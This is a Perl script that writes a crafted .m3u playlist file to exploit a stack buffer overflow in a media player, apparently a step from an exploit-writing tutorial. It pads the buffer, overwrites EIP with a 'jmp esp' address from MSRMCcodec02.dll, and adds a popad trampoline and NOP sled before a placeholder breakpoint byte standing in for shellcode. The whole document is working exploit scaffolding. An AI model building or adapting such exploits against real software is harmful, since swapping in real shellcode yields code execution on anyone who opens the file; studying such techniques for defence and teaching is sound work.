my $file= "test1.m3u";
my $buffersize = 26074;

my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";

my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = pack('V',0x01AAF23A);  #jmp esp from MSRMCcodec02.dll

my $preshellcode = "X" x 4;  # needed to point ESP at next 13 bytes below
$preshellcode=$preshellcode."\x61" x 9;  #9 popads
$preshellcode=$preshellcode."\xff\xe4";  #10th and 11th byte, jmp esp
$preshellcode=$preshellcode."\x90\x90\x90";  #fill rest with some nops

my $garbage = "\x44" x 100;  #garbage to jump over 

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print "Size of buffer : ".length($buffer)."\n";

open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
print "m3u File Created successfully\n";

